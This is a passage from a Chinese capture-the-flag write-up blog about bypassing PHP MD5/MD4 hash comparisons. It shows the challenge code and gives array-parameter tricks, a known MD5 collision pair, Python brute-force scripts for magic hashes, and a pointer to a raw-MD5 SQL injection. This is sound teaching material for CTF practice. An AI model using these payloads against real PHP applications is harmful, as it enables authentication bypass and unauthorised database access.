name="q6lP9"></a></p><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>两串不一样的字符，加密结果却相同：</p><pre class=" language-bash"><code class="language-bash"><span class="token variable">$a</span><span class="token operator">=</span>M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2<span class="token variable">$b</span><span class="token operator">=</span>M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</code></pre><p><img src="/Blogimages/2/2-5.png"><br>这个我的脚本就跑不出来了，是网上收集的。<br><a name="r2uDz"></a></p><h2 id="题目实战："><a href="#题目实战：" class="headerlink" title="题目实战："></a>题目实战：</h2><p><a name="lz95C"></a></p><h3 id="1-BJDCTF2020-Easy-MD5"><a href="#1-BJDCTF2020-Easy-MD5" class="headerlink" title="1.[BJDCTF2020]Easy MD5"></a>1.[BJDCTF2020]Easy MD5</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param1'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这题也是两个解法：</p><pre class=" language-bash"><code class="language-bash">法一：param1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>1<span class="token operator">&amp;</span>param2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>2法二：param1<span class="token operator">=</span>M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2<span class="token operator">&amp;</span>param2<span class="token operator">=</span>M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</code></pre><p><a name="jh3Lk"></a></p><h3 id="2-强网杯2020——Funhash"><a href="#2-强网杯2020——Funhash" class="headerlink" title="2.强网杯2020——Funhash"></a>2.强网杯2020——Funhash</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">'conn.php'</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">"index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//level 1</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"hash1"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token function">hash</span><span class="token punctuation">(</span><span class="token string">"md4"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"hash1"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'level 1 failed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//level 2</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'hash2'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'hash3'</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'hash2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'hash3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'level 2 failed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//level 3</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM flag WHERE password = '"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"hash4"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"'"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> </code></pre><p><a name="EMcpk"></a></p><h4 id="levle-1"><a href="#levle-1" class="headerlink" title="levle 1"></a>levle 1</h4><p>很明显，这种是要md4加密，并且是”0e”+”数字” 加密后还是”0e”+”数字”的形式，上脚本：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> multiprocessing<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> random<span class="token keyword">import</span> string<span class="token keyword">import</span> sysCHARS <span class="token operator">=</span> string<span class="token punctuation">.</span>digits<span class="token keyword">def</span> <span class="token function">cmp_md4</span><span class="token punctuation">(</span>substr<span class="token punctuation">,</span> stop_event<span class="token punctuation">,</span> str_len<span class="token punctuation">,</span> start<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> CHARS    <span class="token keyword">while</span> <span class="token operator">not</span> stop_event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        rnds <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>CHARS<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>        rnds <span class="token operator">=</span> <span class="token string">"0e"</span><span class="token operator">+</span>rnds        md4 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'md4'</span><span class="token punctuation">,</span> rnds<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        value <span class="token operator">=</span> md4<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> value<span class="token punctuation">[</span>start<span class="token punctuation">:</span> start <span class="token operator">+</span> str_len<span class="token punctuation">]</span> <span class="token operator">==</span> substr<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>            <span class="token keyword">if</span> value<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>rnds<span class="token punctuation">)</span>                stop_event<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    substr <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    start_pos <span class="token operator">=</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span> <span class="token keyword">else</span> <span class="token number">0</span>    str_len <span class="token operator">=</span> len<span class="token punctuation">(</span>substr<span class="token punctuation">)</span>    cpus <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>cpu_count<span class="token punctuation">(</span><span class="token punctuation">)</span>    stop_event <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>    processes <span class="token operator">=</span> <span class="token punctuation">[</span>multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>cmp_md4<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>substr<span class="token punctuation">,</span>                                                               stop_event<span class="token punctuation">,</span> str_len<span class="token punctuation">,</span> start_pos<span class="token punctuation">)</span><span class="token punctuation">)</span>                 <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>cpus<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> p <span class="token keyword">in</span> processes<span class="token punctuation">:</span>        p<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> p <span class="token keyword">in</span> processes<span class="token punctuation">:</span>        p<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>                </code></pre><p><img src="/Blogimages/2/2-6.png"><br>测试一下，可行<br><img src="/Blogimages/2/2-7.png"><br><a name="GT9CN"></a></p><h4 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h4><pre class=" language-bash"><code class="language-bash">法一：hash2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>1<span class="token operator">&amp;</span>hash3<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>2法二：hash2<span class="token operator">=</span>M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2<span class="token operator">&amp;</span>hash3<span class="token operator">=</span>M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</code></pre><p><a name="Gvn9O"></a></p><h4 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h4><p><img src="/Blogimages/2/2-8.png"><br>结果：<br><img src="/Blogimages/2/2-9.png"><br>只要构造 <code>xx &#39;or xxxx</code> 的形式就可以了<br>具体可以看<a href="https://blog.csdn.net/March97/article/details/81222922">这篇文章</a></p><p><a name="QMEO5"></a></p><h3 id="3-构造特定字符串"><a href="#3-构造特定字符串" class="headerlink" title="3.构造特定字符串"></a>3.构造特定字符串</h3><p>这个是我觉得以后为了避免大家都用现有的收集字符串解题而出的，比如：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">==</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"nonono"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>要构造一个开头是123且后面是字母的字符串：<br>脚本：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> multiprocessing<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> random<span class="token keyword">import</span> string<span class="token keyword">import</span> sysCHARS <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token keyword">def</span> <span class="token function">cmp_md5</span><span class="token punctuation">(</span>substr<span class="token punctuation">,</span> stop_event<span class="token punctuation">,</span> str_len<span class="token punctuation">,</span> start<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> CHARS    <span class="token keyword">while</span> <span class="token operator">not</span> stop_event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        rnds <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>CHARS<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>        md5 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>rnds<span class="token punctuation">)</span>        value <span class="token operator">=</span> md5<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> value<span class="token punctuation">[</span>start<span class="token punctuation">:</span> start <span class="token operator">+</span> str_len<span class="token punctuation">]</span> <span class="token operator">==</span> substr<span class="token punctuation">:</span>            <span class="token keyword">print</span> rnds            <span class="token keyword">print</span> value            stop_event<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    substr <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    start_pos <span class="token operator">=</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span> <span class="token keyword">else</span> <span class="token number">0</span>    str_len <span class="token operator">=</span> len<span class="token punctuation">(</span>substr<span class="token punctuation">)</span>    cpus <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>cpu_count<span class="token punctuation">(</span><span class="token punctuation">)</span>    stop_event <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>    processes <span class="token operator">=</span> <span class="token punctuation">[</span>multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>cmp_md5<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>substr<span class="token punctuation">,</span>                                                               stop_event<span class="token punctuation">,</span> str_len<span class="token punctuation">,</span> start_pos<span class="token punctuation">)</span><span class="token punctuation">)</span>                 <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>cpus<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> p <span class="token keyword">in</span> processes<span class="token punctuation">:</span>        p<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> p <span class="token keyword">in</span> processes<span class="token punctuation">:</span>        p<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>终端输入<code>python .\MD5碰撞.py &quot;123&quot; 0</code><br><img src="/Blogimages/2/2-10.png"><br>实践试一下：<br><img src="/Blogimages/2/2-11.png"><br><code>注意点：跑出来的123后面第一个字符要是字母，如果不是多跑几次，概率还是挺大的。</code></p><p><a name="D6C2L"></a></p><h3 id="尾言"><a href="#尾言" class="headerlink" title="尾言"></a>尾言</h3><p>还有关于双md5的题目等等，只要掌握了这些思想，看到题目就能想到解法了。这个脚本也是面向百度编程找到的，有一个脚本能跑是比较好的，可以应对各种新情况。使用python脚本是因为有多线程模式，速度更快。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
